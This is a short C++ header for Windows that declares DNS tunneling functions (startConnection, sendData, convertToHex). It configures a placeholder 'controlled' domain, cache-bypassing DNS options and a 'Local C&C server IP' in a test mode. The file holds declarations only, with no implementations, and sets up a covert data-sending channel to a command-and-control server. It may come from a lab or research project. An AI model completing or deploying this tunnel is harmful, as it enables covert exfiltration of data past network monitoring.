#pragma once
#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <windns.h>
#include <string>


// DNS Query Options
constexpr DWORD DNS_OPTIONS = DNS_QUERY_BYPASS_CACHE | DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE;

// Target domain (your controlled domain)
inline std::string TARGET_DOMAIN = "example.com";


// LOCAL TEST MODE

inline const char* DNS_SERVER_IP = "100.111.111.100";  // Local C&C server IP


// ==========================================
// DNS TUNNELING FUNCTIONS
// ==========================================
int startConnection(const char* domain);
int sendData(int& id, int& packetNumber, const char* domain, const char* data);
std::string convertToHex(const char* string);
